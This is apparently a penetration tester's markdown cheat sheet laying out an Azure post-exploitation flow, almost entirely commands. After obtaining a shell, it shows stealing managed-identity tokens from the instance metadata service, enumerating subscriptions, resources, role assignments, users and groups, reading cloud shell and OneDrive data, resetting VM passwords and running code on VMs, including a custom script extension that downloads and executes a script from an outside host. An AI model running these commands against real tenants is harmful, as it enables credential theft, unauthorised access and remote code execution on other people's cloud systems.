# Exploitation Flow 
### Login tricks

```
### Try this
$pscredential = Get-Credential
Connect-AzureRmAccount -ServicePrincipal -ApplicationId "http://my-app" -Credential $pscredential -TenantId $tenantid
```

### 1. Get shell 

### 2. ```env```

### 3. Metadata 

3.1 Get metadata of the azure vm
```
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```
3.2 Get auth token of managed identity
```
curl -H Metadata:true -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F'
```

### 4. Enum
4.1 Get list of subscriptions
```
curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions?api-version=2020-01-01
```

4.2 List of resource groups and resources
```
curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions/${SUB_ID}/resourcegroups?api-version=2019-10-01
curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2019-10-01 
```

### 5. ARM resources
List resources user has atlease read privilege
```az role assignment list --scope <resource-id> --include-inherited```
```curl -X GET -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" "https://management.azure.com/<resource-id>/providers/Microsoft.Authorization/roleAssignments?api-version=2020-04-01-preview"```

Access cloud shell drive data
```
curl -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -X GET "https://portal.azure.com/api/v1/?environment=clouddrive"
```

Get deployment history ```az deployment group list --resource-group rgname```

#### VM commands

VM password reset 
```
az vm user update -u username -p password -n <VM_Name> -g <Resource_Group>
```

VM run command
```
Invoke-AzVMRunCommand -CommandId 'RunPowerShellScript' -ScriptPath .\whoami.ps1
```

VM command for running a ps script
```
Set-AzVMCustomScriptExtension -ResourceGroupName TEST -VMName PentestVM -Location westcentralus -FileUri 'http://book.azurepentesting.com/whoami.ps1' -Run 'whoami.ps1' -Name CustomScriptExtension
```

### 6. MS Graph access
Get access token
```az account get-access-token --resource https://graph.microsoft.com```

Get user info
```curl -H "Authorization: Bearer ${TOKEN}" https://graph.microsoft.com/v1.0/me```

Get list of users
```curl -X GET -H "Authorization: Bearer ${TOKEN}" https://graph.microsoft.com/v1.0/users ```

Get list of Groups
```curl -X GET -H "Authorization: Bearer ${TOKEN}" https://graph.microsoft.com/v1.0/groups```

Get groups
```
az role assignment list --scope /subscriptions/2213e8b1-dbc7-4d54-8aff-b5e315df5e5b/resourceGroups/1-6417d8f7-playground-sandbox/ --include-inherited
```

List of groups I am a member of 
```
curl -X GET -H "Authorization: Bearer ${TOKEN}" "https://graph.microsoft.com/v1.0/me/memberOf/$/microsoft.graph.group?$filter=groupTypes/any(c:c%20eq%20'unified')"
```

curl -X GET -H "Authorization: Bearer ${TOKEN}" "https://graph.microsoft.com/v1.0/me/drive/root/children"


### Misc useful commands


### Lab setup 
```az deployment group create --resource-group sec --template-file ./file.json```
